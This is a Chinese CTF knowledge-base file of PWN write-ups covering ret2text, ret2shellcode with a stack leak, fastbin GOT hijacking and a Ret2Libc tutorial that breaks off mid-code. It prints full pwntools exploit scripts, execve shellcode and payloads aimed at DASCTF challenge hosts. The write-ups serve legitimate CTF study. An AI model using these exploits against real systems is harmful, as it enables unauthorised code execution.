---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'ef166535-3bf2-4446-942f-239cb52389d9'
  PropagateID: 'ef166535-3bf2-4446-942f-239cb52389d9'
  ReservedCode1: 'bfbb95dd-ce04-49c8-9a21-0432815b2173'
  ReservedCode2: 'bfbb95dd-ce04-49c8-9a21-0432815b2173'
---

# CTF 知识库 — PWN方向

> 本文件由 CTF解题笔记本.md 自动拆分生成，如需查看完整原始笔记请参阅原文件。

---

## PWN 栈溢出 + 后门函数（IDA 辅助分析）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN - 栈溢出（Ret2Text） |
| 难度 | 入门 |
| 日期 | 2026-07-30 |
| 工具 | IDA Pro 9.3（反编译）、pwntools（exploit） |

### 题目描述

ELF 64位可执行文件，通过 `ncat --ssl <host> 9999` 远程连接。程序输出一段欢迎信息和一个地址泄露，然后等待用户输入。

### IDA 反编译结果

**main 函数 (0x40061D)**
```c
__int64 main() {
    char s[64];                              // [rbp-80h] 缓冲区
    write(1, "-Warm Up-\n", 10);
    write(1, "WOW:", 4);
    sprintf(s, "%p\n", sub_40060D);          // 泄露后门函数地址
    write(1, s, 9);
    write(1, ">", 1);
    return gets();                           // gets() 无长度限制 → 栈溢出!
}
```

**后门函数 sub_40060D (0x40060D)**
```c
int sub_40060D() {
    return system("cat flag.txt");           // 直接读取 flag!
}
```

### 解题思路

**1. 漏洞分析**

- `gets()` 读取输入到 `[rbp-0x40]`，无长度限制，导致栈溢出
- 程序内置后门函数 `sub_40060D`，直接调用 `system("cat flag.txt")`
- 程序通过 `sprintf(s, "%p", sub_40060D)` 主动泄露后门地址
- ELF 无 PIE（固定基址 0x400000），后门地址恒为 0x40060D

**2. 偏移量计算**

从 IDA 汇编分析：
```
0x400692: lea rax, [rbp+var_40]    ; gets 输入缓冲区在 rbp-0x40
0x400696: mov rdi, rax
0x400699: call _gets
```

- gets 缓冲区起始：`rbp - 0x40`
- 到 saved rbp 的距离：0x40 = 64 字节
- 到返回地址的距离：0x40 + 8 = 72 字节（0x48）

**3. 栈对齐处理**

x86-64 的 `system()` 在某些 libc 版本中要求 16 字节栈对齐。直接跳转到后门函数入口可能导致 `movaps` 指令崩溃。解决方案：在 payload 中添加一个 `ret` gadget 进行栈对齐。

```
ret gadget 地址：0x4006A4（main 函数末尾的 retn 指令）
```

**4. Payload 结构**

```
[填充 72 字节 'A'] + [ret gadget 0x4006A4] + [后门地址 0x40060D]
     64字节缓冲区+8字节rbp        8字节栈对齐         8字节返回地址
```

### 解题脚本

```python
from pwn import *
import ssl, socket

HOST = '39f71dab837b6029aa64ce18.tcp-ctf2.dasctf.com'
PORT = 9999

BACKDOOR_ADDR = 0x40060D      # sub_40060D: system("cat flag.txt")
RET_GADGET = 0x4006A4         # ret 指令（栈对齐）
OFFSET = 0x40 + 8             # 72 字节：64 填充 + 8 saved rbp

# SSL 连接
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = ctx.wrap_socket(sock, server_hostname=HOST)
ssl_sock.connect((HOST, PORT))

# 接收泄露
data = ssl_sock.recv(4096)
print(f"Received: {data}")

# 构造 payload
payload = b'A' * OFFSET + p64(RET_GADGET) + p64(BACKDOOR_ADDR)
ssl_sock.send(payload + b'\n')

# 接收 flag
import time; time.sleep(2)
print(ssl_sock.recv(4096).decode())
```

### 运行结果

```
[*] Received: b'-Warm Up-\nWOW:0x40060d\n>'
[*] Leaked backdoor address: 0x40060d
[*] Payload length: 88
[*] Response: CTF2{fd5d48ff-5eb9-4ed2-b9d6-3aca695e0a88}
```

Flag: `CTF2{fd5d48ff-5eb9-4ed2-b9d6-3aca695e0a88}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 栈溢出（Stack Overflow） | gets() 无长度限制，可覆盖返回地址 |
| Ret2Text | 跳转到程序内置的代码段（后门函数）执行 |
| IDA Pro 反编译 | 使用 idat 批处理模式自动反编译，提取伪代码和汇编 |
| 栈对齐（Stack Alignment） | x86-64 下 system() 要求 16 字节对齐，需 ret gadget 修正 |
| 地址泄露 | 程序通过 %p 格式化输出后门函数地址 |
| ELF 无 PIE | 固定基址 0x400000，函数地址不变，无需信息泄露 |
| pwntools | p64() 打包地址，构造二进制 payload |

### 同类变体与扩展

- 若无后门函数，需 Ret2libc：泄露 libc 基址 → 计算 system() 和 /bin/sh 地址 → 构造 ROP 链
- 若有 Canary 保护，需先泄露 canary 值再溢出
- 若有 PIE，需先泄露代码段基址
- 若使用 `one_gadget`，可直接跳转到 libc 中 execve("/bin/sh") 的 one-gadget RCE 地址
- IDA 批处理脚本可进一步扩展：自动识别危险函数（gets/strcpy/sprintf）、自动计算偏移量

---

## PWN 栈溢出 + 浮点数条件绕过（IDA 辅助分析）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN - 栈溢出（Ret2Text 变体） |
| 难度 | 入门 |
| 日期 | 2026-07-31 |
| 工具 | IDA Pro 9.3（反编译）、pwntools（exploit） |

### 题目描述

ELF 64位可执行文件，远程连接后提示 "Let's guess the number."，要求猜一个数字。程序内含 `system("cat /flag")` 调用，但浮点数条件判断使正常流程无法到达。

### IDA 反编译结果

**func 函数 (0x400676)**
```c
int func() {
    puts("Let's guess the number.");
    gets();                                    // gets() 栈溢出！缓冲区在 rbp-0x30
    if (11.28125 == 0.0)                       // 浮点数比较，永远为 FALSE
        return system("cat /flag");            // 死代码，正常走不到
    else
        return puts("Its value should be 11.28125");
}
```

**关键汇编**
```asm
0x400691: lea rax, [rbp+var_30]        ; gets 输入缓冲区 rbp-0x30
0x40069D: call _gets                   ; 栈溢出点
0x4006A7: ucomiss xmm0, cs:dword_4007F4  ; 11.28125 vs 0.0
0x4006BC: jnz  short loc_4006CF        ; 跳转到 else 分支
0x4006BE: mov edi, offset command       ; "cat /flag" ← 目标地址!
0x4006C3: mov eax, 0
0x4006C8: call _system
```

### 解题思路

**1. 漏洞分析**

- `gets()` 读取到 `[rbp-0x30]`，无长度限制 → 栈溢出
- 浮点数比较 `11.28125 == 0.0` 永远为 FALSE → 正常流程走不到 `system("cat /flag")`
- 无论输入什么数字，都会输出 "Its value should be 11.28125"

**2. 绕过方式**

不需要满足浮点数条件！直接通过栈溢出覆盖返回地址，跳转到 `system("cat /flag")` 的调用点 `0x4006BE`。

**3. 偏移量计算**

从 IDA 汇编：
- gets 缓冲区起始：`rbp - 0x30`
- 到 saved rbp：0x30 = 48 字节
- 到返回地址：0x30 + 8 = 56 字节

**4. Payload 结构**

```
[填充 56 字节 'A'] + [0x4006BE]
     48字节缓冲区+8字节rbp    system("cat /flag") 调用点
```

注意：跳转目标是 `0x4006BE`（`mov edi, "cat /flag"` 指令），而非函数开头 `0x400676`。这样直接进入 system 调用，无需满足任何条件。

### 解题脚本

```python
from pwn import *
import ssl, socket

HOST = 'f50ba9f58e7c20a5aa07c700.tcp-ctf2.dasctf.com'
PORT = 9999

SYSTEM_CALL = 0x4006BE       # mov edi, "cat /flag"; call system
OFFSET = 0x30 + 8            # 56 字节

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = ctx.wrap_socket(sock, server_hostname=HOST)
ssl_sock.connect((HOST, PORT))

# Receive prompt
data = ssl_sock.recv(4096)
print(data.decode())

# Send payload
payload = b'A' * OFFSET + p64(SYSTEM_CALL)
ssl_sock.send(payload + b'\n')

# Get flag
import time; time.sleep(2)
print(ssl_sock.recv(4096).decode())
```

### 运行结果

```
[*] Received: b"Let's guess the number.\n"
[*] Result: Its value should be 11.28125
CTF2{619d0c3f-3afe-4e01-8217-81ccc77243ab}
```

Flag: `CTF2{619d0c3f-3afe-4e01-8217-81ccc77243ab}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| gets() 栈溢出 | 无长度限制的输入函数，经典溢出源 |
| 浮点数条件绕过 | 11.28125 == 0.0 永远为 FALSE，正常流程不可达 |
| Ret2Text（指令片段跳转） | 不跳函数开头，直接跳到 system 调用的 gadget 地址 |
| IDA 精确定位 gadget | 通过反编译/汇编找到 `mov edi, "cat /flag"` 的精确地址 |
| ucomiss 指令 | SSE 浮点数比较指令，影响 ZF/PF/CF 标志位 |
| 无 PIE | 固定地址 0x400000，可直接硬编码跳转地址 |

### 与第4题对比

| 特征 | 第4题 (pwn1) | 第5题 (pwn2) |
|------|---------------|---------------|
| 缓冲区位置 | rbp-0x40 | rbp-0x30 |
| 溢出偏移 | 72 字节 | 56 字节 |
| 后门函数 | 独立函数 sub_40060D | 死代码片段（条件不可达） |
| 绕过方式 | 覆盖返回地址跳函数 | 覆盖返回地址跳 gadget |
| 栈对齐 | 需要 ret gadget | 不需要 |
| 地址泄露 | 程序主动泄露 | 无泄露（也不需要） |

### 同类变体与扩展

- 若目标需要多个参数，可构造 ROP 链逐个设置 rdi/rsi/rdx
- 若 `system()` 不可用，可找 `execve()` 的 one-gadget
- 浮点数条件题型的其他解法：直接覆盖栈上的浮点变量 var_4 为 0.0

---

## bypwn — 栈溢出 + Ret2Shellcode（栈地址泄露）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN - 栈溢出 + Shellcode 注入 |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 题目文件 | `bypwn`（6368字节，64位 ELF，stripped） |
| 远程地址 | `ncat --ssl 1763753f1788882586611eed.tcp-ctf2.dasctf.com 9999` |

### 二进制分析

**安全保护：**

| 保护 | 状态 | 说明 |
|------|------|------|
| RELRO | Partial | GOT 可写 |
| Stack Canary | **无** | 可直接溢出 |
| NX | **关闭** | GNU_STACK flags=XWR，栈可执行 |
| PIE | **关闭** | 地址固定 |

**关键函数（反汇编）：**

```
get_input (0x4007f9):
  sub rsp, 0x20                    // 32字节缓冲区
  memset(rbp-0x20, 0, 0x20)
  puts("well you input:")
  read(0, rbp-0x20, 0x20)         // [1] 读取32字节，无null终止
  strdup(rbp-0x20)                 // [2] 复制到堆，无null则读取栈上数据
  printf("check it, %s\n", dup)    // [3] 打印内容 → 泄露栈地址
  return dup

main (0x400863):
  sub rsp, 0x50                    // 80字节局部变量
  call get_input                   // 获取输入
  puts("EASY PWN PWN PWN~")
  scanf("%s", rbp-0x50)            // [4] 栈溢出！0x50+8=88字节到ret
  puts("bye~")
  leave; ret
```

**栈布局：**

```
get_input 栈帧:                main 栈帧:
  rbp-0x20: read buf (32B)       rbp-0x50: scanf buf (80B)
  rbp+0x00: saved rbp ← 泄露    rbp+0x00: saved rbp
  rbp+0x08: ret addr             rbp+0x08: ret addr ← 溢出目标
```

### 漏洞分析

**漏洞1：栈地址泄露（get_input）**

`read(0, buf, 0x20)` 读取恰好 32 字节，不添加 null 终止符。随后 `strdup(buf)` 会从栈缓冲区持续复制直到遇到 null 字节。如果输入 32 个非 null 字节，`strdup` 会读取到缓冲区之后的 `saved rbp`（栈地址），然后 `printf("%s")` 将其打印出来。

```
输入: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  (32个'A')
strdup读取: [32字节输入][6-8字节saved rbp][3字节ret addr遇到0x00停止]
printf输出: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<saved_rbp_bytes>
```

**漏洞2：栈溢出（main 的 scanf）**

`scanf("%s", rbp-0x50)` 无长度限制，`%s` 读取直到空白字符。缓冲区 80 字节，saved rbp 8 字节，返回地址 8 字节。溢出偏移 = 0x50 + 8 = **88 字节**。

**scanf 坏字节限制：**

`scanf("%s")` 在以下字符处停止：`0x09`(tab) `0x0a`(newline) `0x0b`(vtab) `0x0c`(formfeed) `0x0d`(cr) `0x20`(space)

这导致关键 gadget 地址不可用：

| Gadget | 地址 | 坏字节 | 可用 |
|--------|------|--------|------|
| `pop rdi; ret` | 0x400923 | 0x09 | ❌ |
| `call rsp` | 0x4009a3 | 0x09 | ❌ |
| `ret` | 0x400611 | 无 | ✅ |
| `leave; ret` | 0x4008b2 | 无 | ✅ |
| `jmp rax` | 0x400715 | 无 | ✅ |

> **关键**：由于 `pop rdi; ret` 地址含 0x09，无法通过 scanf payload 使用 ret2libc。但 NX 关闭意味着可以直接在栈上执行 shellcode——只要能泄露栈地址。

### 攻击策略：两阶段 Ret2Shellcode

**Phase 1：泄露栈地址**

```
[get_input 阶段]
  发送: 32个非null字节 (如 'A'*32)
  read() 读入32字节到 rbp-0x20
  strdup() 读取到 saved rbp → printf 输出
  
  解析输出:
    leaked = "AAAA...AAAA" + saved_rbp_bytes
    saved_rbp = leaked[32:40]  → main 的 rbp值
    scanf_buf = saved_rbp - 0x50  → scanf 缓冲区地址
```

**Phase 2：Shellcode 注入**

```
[scanf 阶段]
  Payload = [shellcode(26B)] + [padding(62B)] + [ret_addr(8B)]
            ↑                        ↑               ↑
            scanf_buf地址          填充至88字节      p64(scanf_buf)
```

scanf 读入 payload，shellcode 存放在栈上 scanf_buf 处。当 main 返回时，跳转到 scanf_buf 执行 shellcode。

**Shellcode（execve("//bin/sh", NULL, NULL)，26字节）：**

```asm
xor rsi, rsi                      ; argv = NULL
push rsi                           ; null terminator
movabs rdi, 0x68732f6e69622f2f    ; "//bin/sh" (避免null字节)
push rdi
mov rdi, rsp                       ; rdi = ptr to string
push 59                            ; sys_execve
pop rax
xor rdx, rdx                      ; envp = NULL
syscall
```

> **技巧**：使用 `"//bin/sh"` 而非 `"/bin/sh"` 是因为 `movabs rdi, imm64` 中的立即数不能含 null 字节。`"/bin/sh\0"` 末尾有 0x00，而 `"//bin/sh"` 的 8 字节编码 `2f 2f 62 69 6e 2f 73 68` 完全无 null。

### 解题过程

```python
from pwn import *

# Phase 1: 泄露栈地址
p = remote(host, port, ssl=True)
p.recvuntil(b'well you input:\n')
p.send(b'A' * 32)                    # 32字节，无null终止
p.recvuntil(b'check it, ')
leaked = p.recvuntil(b'\n', drop=True)
saved_rbp = u64(leaked[32:40].ljust(8, b'\x00'))
scanf_buf = saved_rbp - 0x50

# Phase 2: shellcode溢出
p.recvuntil(b'EASY PWN PWN PWN~')
payload = shellcode + b'B' * (88 - len(shellcode)) + p64(scanf_buf)
p.sendline(payload)

# Phase 3: getshell
p.recvuntil(b'bye~')
p.sendline(b'cat /flag*')
# → CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}
```

**运行结果：**

```
[Phase 1] Leaking stack address...
  Saved RBP (main's rbp): 0x00007ffcc505b340
  Scanf buffer: 0x00007ffcc505b2f0
  Address is clean!

[Phase 2] Sending shellcode + overflow...
  Payload is clean! (96 bytes)
  Shellcode at: 0x00007ffcc505b2f0

[Phase 3] Getting shell...
  Got 'bye~', shellcode executing...
  CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}
```

Flag: `CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| scanf 栈溢出 | `scanf("%s")` 无长度限制，`%s` 遇空白字符停止，需注意坏字节 |
| read 无终止符泄露 | `read()` 不添加 null 终止符，`strdup`/`printf("%s")` 会读取到栈上额外数据 |
| 栈地址泄露 | 通过 `strdup` 越界读取 `saved rbp` 泄露栈地址，计算 scanf 缓冲区位置 |
| NX 关闭 + Ret2Shellcode | 栈可执行时，直接将 shellcode 写入栈并跳转执行 |
| scanf 坏字节绕过 | `0x09` 导致 `pop rdi;ret` 不可用 → 改用直接跳转 shellcode 绕过 |
| shellcode 无 null 技巧 | 使用 `"//bin/sh"` 替代 `"/bin/sh"` 避免 `movabs` 中的 null 字节 |
| GNU_STACK 权限 | `GNU_STACK` 的 `flags=XWR` 表示栈可读可写可执行 |

> **技巧**：当 `scanf("%s")` 坏字节阻止使用 `pop rdi; ret` 等关键 gadget 时，如果 NX 关闭，可以直接走 Ret2Shellcode 路线：①通过 `read`+`strdup`+`printf` 链泄露栈地址 → ②在 scanf 缓冲区放置 shellcode → ③覆盖返回地址跳到 shellcode。这比 ret2libc 更直接，不需要 libc 地址。

> **技巧**：`strdup` 是一个隐蔽的泄露原语。它从源地址持续复制直到 null 字节，如果源缓冲区没有 null 终止，就会读到栈上的 `saved rbp`（栈地址）和返回地址（代码段地址）。配合 `printf("%s")` 可以无格式化字符串漏洞就实现信息泄露。

> **技巧**：Windows 上 pwntools 的 `asm()` 需要 `binutils`，如果没有安装可以直接使用预编译的 shellcode 字节序列。用 `capstone` 或在线工具（如 shell-storm.org）编译。

### 同类变体与扩展

- **ASLR 影响**：每次运行栈地址不同，所以必须每次泄露。本题通过 Phase 1 动态泄露解决
- **scanf 坏字节变体**：如果目标地址含 0x0a（`\n`），scanf 也会停止。可以在 shellcode 中加 NOP sled 并调整跳转地址避开
- **ret2libc 备选**：如果 NX 开启，可以尝试：①利用 `jmp rax`(0x400715) 配合 puts 返回值 → ②`leave;ret` 做栈迁移到 .bss → ③在 .bss 布置 ROP 链（但 .bss 不可执行，需要 ret2libc）
- **one_gadget**：如果能泄露 libc，使用 `one_gadget` 工具找一键 RCE 地址，无需 `pop rdi`
- **防御建议**：开启 NX（`-z noexecstack`）、Canary（`-fstack-protector-all`）、PIE（`-fPIE`）、Full RELRO（`-z relro -z now`），使用 `fgets` 替代 `scanf`

### 解题脚本

完整脚本：[PWN/06-bypwn/exploit.py](PWN/06-bypwn/exploit.py)

反编译分析：[PWN/06-bypwn/decompiled.txt](PWN/06-bypwn/decompiled.txt)

---

---

## easyheap — 堆溢出 + Fastbin Attack + GOT 劫持

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN - 堆利用（Heap Exploitation） |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 远程地址 | `ncat --ssl 7ce2ae89db34ba28434d328c.tcp-ctf2.dasctf.com 9999` |
| Flag | `CTF2{eeeec215-f3d6-41e3-961f-9544f77ed57c}` |

### 二进制保护

| 保护 | 状态 | 说明 |
|------|------|------|
| Canary | ✅ 开启 | 堆操作函数有栈保护 |
| NX | ✅ 开启 | 栈不可执行 |
| PIE | ❌ 关闭 | 地址固定 |
| RELRO | Partial | GOT 可写（关键！） |

### 程序结构

菜单驱动的堆管理器：

```
1. Create a Heap   — malloc(size) + read_input(heap, size)
2. Edit a Heap     — read new_size + read_input(heap, new_size)  ← 漏洞！
3. Delete a Heap   — free(heap) + heaparray[i] = NULL  ← 安全
4. Exit
```

隐藏功能：输入 `4869`（0x1305）检查 BSS 变量 `magic` > 0x1305 时调用后门 `l33t()`。

### 漏洞分析

**edit_heap 堆溢出（核心漏洞）**：

```c
void edit_heap() {
    int index = read_int("Index :");
    // 边界检查 OK
    if (heaparray[index] == NULL) { puts("No such heap!"); return; }
    int new_size = read_int("Size of Heap :");  // ← 用户可控的新 size！
    read_input(heaparray[index], new_size);      // ← 写入超过原始 malloc 大小！
}
```

> ⚠️ **关键漏洞**：`edit_heap` 允许用户重新输入 size，但写入的是**已有堆块**。如果新 size > 原 malloc size，就会溢出到相邻堆块的 metadata。

**delete_heap 安全**：free 后正确置 NULL，无 UAF。

**后门函数 l33t()**：`system("cat /home/pwn/flag")` — 但远程 flag 在 `/flag`，路径错误！

### 利用策略：Fastbin Attack → atoi@GOT → system → Shell

由于后门路径错误，不能直接触发 `l33t()`。改用 **Fastbin Attack 劫持 GOT 表** 获取 shell。

#### GOT 目标

| 函数 | PLT 地址 | GOT 地址 | 用途 |
|------|----------|----------|------|
| system | 0x400700 | 0x602038 | 替换目标值 |
| atoi | 0x400760 | 0x602068 | 被劫持的 GOT 入口 |

> **技巧**：main 循环中 `atoi(user_input)` 将用户输入转为 menu choice。如果将 `atoi@GOT` 覆写为 `system@PLT`，输入 `"/bin/sh"` 就会执行 `system("/bin/sh")`。

#### Fastbin Attack 原理（glibc 2.23，无 tcache）

1. **free chunk1 → fastbin[0x70]**：`fastbin_head → chunk1 → NULL`
2. **溢出 chunk0 → 篡改 chunk1.fd**：`fastbin_head → chunk1 → fake_chunk → NULL`
3. **malloc 两次**：第一次弹出 chunk1，第二次弹出 fake_chunk
4. fake_chunk 定位在 BSS 中，利用 `stdout` 的 libc 地址作为 fake size（0x7f）

#### Fake Chunk 构造（0x7f size 技巧）

```
BSS 布局：
  0x6020a0: stdout (libc FILE* 指针，形如 0x00007fXXXXXXXXXX)
  0x6020e0: heaparray[0..9]

stdout 的 libc 地址第 6 字节（偏移 +5）为 0x7f。
构造 fake chunk 在 0x60209d：
  0x60209d + 0x08 = 0x6020a5 → 该位置读出的 qword = 0x000000000000007f
  fastbin_index(0x7f & ~0x7) = fastbin_index(0x78) = (0x78 >> 4) - 2 = 5
  fastbin_index(0x70) = (0x70 >> 4) - 2 = 5  ← 相同！glibc 2.23 的检查通过！
```

> ⚠️ **技巧**：glibc 2.23 的 fastbin 检查是 `fastbin_index(chunksize(victim)) == idx`，而 `fastbin_index(0x78) == fastbin_index(0x70) == 5`，所以 0x7f 可以伪装成 0x70 的 fastbin chunk。这是 House of Spirit 技巧的经典应用。

#### 完整利用步骤

```
Step 1: create(0x68, 'A'*0x68)  → chunk0 @ heap+0x00 (size 0x70)
        create(0x68, 'B'*0x68)  → chunk1 @ heap+0x70 (size 0x70)
        create(0x18, 'C'*0x18)  → chunk2 @ heap+0xe0 (guard)

Step 2: free(1) → fastbin[0x70]: chunk1 → NULL

Step 3: edit(0, 0x78, payload)
        payload = 'A'*0x60        ← chunk0 数据
                + p64(0)           ← chunk1 prev_size
                + p64(0x71)        ← chunk1 size（保持不变）
                + p64(0x60209d)    ← chunk1.fd → fake BSS chunk

Step 4: create(0x68, 'D') → 弹出 chunk1
        fastbin[0x70]: fake_chunk(0x60209d) → NULL

Step 5: create(0x68, fake_data) → 弹出 fake_chunk，返回 0x6020ad
        fake_data = '\x00'*0x33          ← 填充到 heaparray[0]
                  + p64(0x602068)         ← heaparray[0] = atoi@GOT

        现在 heaparray[0] 指向 atoi@GOT！

Step 6: edit(0, 8, p64(0x400700))
        → write(atoi@GOT, system@PLT)
        → atoi 现在是 system！

Step 7: sendline("/bin/sh")  → atoi("/bin/sh") → system("/bin/sh") → SHELL!

Step 8: cat /flag → CTF2{eeeec215-f3d6-41e3-961f-9544f77ed57c}
```

### 备选方案：Unsorted Bin Attack（验证后门但 flag 路径错误）

另一种利用方式是 **Unsorted Bin Attack** 写入 `magic` 变量：

1. create(0x18) + create(0x80) + create(0x10 guard)
2. free(1) → unsorted bin（chunk_size 0x90 > fastbin 范围）
3. edit(0, 0x30) 溢出 → 设置 chunk1.bk = 0x6020b0（magic - 0x10）
4. create(0x80) → 精确匹配 → `bck->fd = unsorted_chunks(av)` 写入 magic
5. 输入 4869 → magic > 0x1305 → l33t() → `system("cat /home/pwn/flag")`

> ⚠️ **陷阱**：此方案成功触发后门（输出 "Congrt !"），但 `system("cat /home/pwn/flag")` 报告 "No such file or directory"——flag 实际在 `/flag`，不在 `/home/pwn/flag`。这是出题人的"坑"，需要获取 shell 才能找到正确路径。

### 远程 glibc 版本判断

- 远程 glibc 2.23（无 tcache）：Unsorted Bin Attack 和 Fastbin Attack 均可用
- WSL glibc 2.31（有 tcache）：Tcache Poisoning 方案可用（本地验证），但 Unsorted Bin Attack 失败（有 "unsorted double linked list corrupted" 检查）

### 关键知识点

1. **Fastbin Attack**：通过溢出篡改 freed chunk 的 fd 指针，使 malloc 返回任意地址
2. **0x7f fake size 技巧**：利用 libc 地址的高位 0x7f 字节作为 fake chunk size，绕过 glibc 2.23 的 fastbin index 检查
3. **GOT 劫持**：Partial RELRO 下 GOT 可写，覆写 `atoi@GOT` 为 `system@PLT` 实现任意命令执行
4. **Unsorted Bin Attack**：篡改 freed chunk 的 bk 指针，在 malloc 时触发 `bck->fd = unsorted_chunks(av)`，向目标地址写入 libc 地址
5. **House of Spirit**：在目标区域构造 fake chunk，通过 fastbin 返回该区域地址

### 同类变体与扩展

- **tcache 版本（glibc 2.27+）**：不需要 fake size，直接覆写 tcache next 指针即可。注意 glibc 2.32+ 有 safe-linking 保护（next 指针异或加密）
- **无 system@plt**：如果没有 system 的 PLT，可通过 unsorted bin leak libc → 计算 system 真实地址 → 覆写 `__free_hook` 或 `__malloc_hook`
- **Full RELRO**：如果 GOT 不可写，改用 `__free_hook` / `__malloc_hook` 覆写
- **防御建议**：开启 Full RELRO（`-z relro -z now`）、使用 tcache safe-linking、对 edit 操作进行 size 校验

### 解题脚本

完整脚本：[PWN/07-easyheap/exploit.py](PWN/07-easyheap/exploit.py)

反编译分析：[PWN/07-easyheap/decompiled.txt](PWN/07-easyheap/decompiled.txt)

---

---

## PWN - testpwn (Warm Up) — SSL + ret2text 自动化利用

### 题目信息

| 项目 | 内容 |
|------|------|
| 类型 | PWN |
| 题目 | testpwn (Warm Up) |
| 来源 | DASCTF |
| 靶机 | `ncat --ssl 8dcb6fbad5d62eef64a2472a.tcp-ctf2.dasctf.com 9999` |
| Flag | `CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}` |

### 解题过程

#### 1. 关键发现：靶机使用 SSL/TLS

靶机地址以 `.tcp-ctf2.dasctf.com` 结尾，平台提示连接方式为 `ncat --ssl`，说明服务端使用 SSL/TLS 加密。pwntools 的 `remote()` 默认不走 TLS，需要加 `ssl=True` 参数。

#### 2. 静态分析（PWN Arcanum 自动完成）

```
Arch: amd64 (64-bit, little)
NX: False    Canary: False    PIE: False    RELRO: Partial

危险函数: gets@0x400500, sprintf@0x400510
Win函数: system@0x4004d0
Cat-flag gadget: mov edi, 0x400734 [cat flag] @ 0x400611
自动偏移: 72 bytes (lea rdi,[rbp-0x48] + call gets)
ROP gadgets: pop rdi; ret @0x400713, ret @0x4004a1
```

#### 3. 自动策略推荐

工具自动推荐 ret2text（优先级95）：发现内联 `system("cat flag")` 在 `0x400611`。

#### 4. 自动 payload 构建

```
ret2text: overflow 72 bytes -> call cat_flag_gadget@0x400611
Payload: 96 bytes
  0000: 41*72 (padding) + a1 04 40 00 (ret对齐) + 11 06 40 00 (gadget) + ef be ad de (fake ret)
```

#### 5. 远程利用（SSL模式）

```bash
python pwn_arcanum.py testpwn --remote 8dcb6fbad5d62eef64a2472a.tcp-ctf2.dasctf.com:9999 --ssl --no-interactive
```

输出：
```
Banner: -Warm Up-
Sending payload (96 bytes) ...
cat-flag gadget detected, waiting for output ...

Output:
WOW:0x40060d
>CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}
timeout: the monitored command dumped core

[FLAG] CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}
```

### 知识点

1. **DASCTF 平台 SSL 靶机**：域名含 `.tcp-ctf2.` 的靶机需要 `ncat --ssl` 或 pwntools `ssl=True`
2. **ret2text + cat flag gadget**：gets 栈溢出覆盖返回地址，跳转到 `system("cat flag")`
3. **ret 对齐**：x64 ABI 要求 16 字节栈对齐，在 gadget 前加一个 `ret` 指令
4. **gets 需要 \n**：pwntools 用 `sendline()` 而非 `send()`，因为 `gets()` 读到 `\n` 才返回

### 工具

- PWN Arcanum v1.10：`PWN/pwn-arcanum/pwn_arcanum.py`
- 一键复现：`python pwn_arcanum.py testpwn --remote HOST:PORT --ssl --no-interactive`

> AI生成

---

---

## PWN - Ret2Libc 技术

> 补充日期：2026-08-04 | 优先级：高 | 从基础栈溢出到高级利用的过渡技术

### 基本概念

Ret2Libc（Return to Libc）是栈溢出利用的进阶技术。当目标程序启用了 NX（不可执行栈）保护时，无法将执行载荷写入栈上直接跳转执行。Ret2Libc 通过覆盖返回地址跳转到 libc 库中已有的函数（如 `system()`），利用已有代码完成利用。

### 适用条件

- 存在栈溢出漏洞
- NX 保护开启（栈不可执行）
- libc 地址已知或可泄露

### Ret2Libc 三要素

1. **system() 地址**：libc 中的 `system()` 函数地址
2. **"/bin/sh" 字符串地址**：libc 中的 `/bin/sh` 字符串地址
3. **返回地址**：`system()` 执行完成后的返回地址（可设为 `exit()` 或任意值）

### 利用步骤

**第 1 步：泄露 libc 基址**

```python
from pwn import *

# 选择 puts / printf / write 泄露 GOT 表中函数的真实地址
# 利用 PLT 调用 puts，打印 GOT 表中 puts 的真实地址

elf = ELF('./vuln')
p = remote('host', port)

# 构造 ROP 链：调用 puts(puts@got)
rop = flat(
    b'A' * offset,                    # 填充到返回地址
    elf.plt['puts'],                   # 调用 puts
    elf.sym['main'],                   # puts 返回后回到 main（再次利用）
    elf.got['puts']                    # 参数: puts 的 GOT 地址
)
p.sendline(rop)

leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"泄露的 puts 地址: {hex(leaked_puts)}")
```

**第 2 步：计算 libc 基址**

```python
# 需要知道远程使用的 libc 版本
# 通过泄露的 puts 地址后3位确定 libc 版本
# 或使用 LibcSearcher / pwnlib.libcdb

from pwnlib.libcdb import search_by_symbol_offsets

# 方法1：使用 pwntools 内置 libc 查询
libc = ELF('./libc.so.6')  # 本地或下载的 libc
libc_base = leaked_puts - libc.symbols['puts']
print(f"libc 基址: {hex(libc_base)}")

# 方法2：使用 LibcSearcher
from LibcSearcher import *
libc = LibcSearcher('puts', leaked_puts)
libc_base = leaked_puts - libc['puts']
```

**第 3 步：构造 Ret2Libc Payload**

```python
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# x64 栈布局（需注意参数传递通过 rdi 寄存器）
# 需要一个 pop rdi; ret gadget 来设置第一个参数
pop_rdi = libc_base + 0x26b72  # 用 ROPgadget 查找: ROPgadget --binary libc.so.6 --only "pop|ret"

payload = flat(
    b'A' * offset,
    pop_rdi,          # pop rdi; ret
    binsh_addr,        # rdi = "/bin/sh" 地址
    system_addr        # 调用 system("/bin/sh")
)

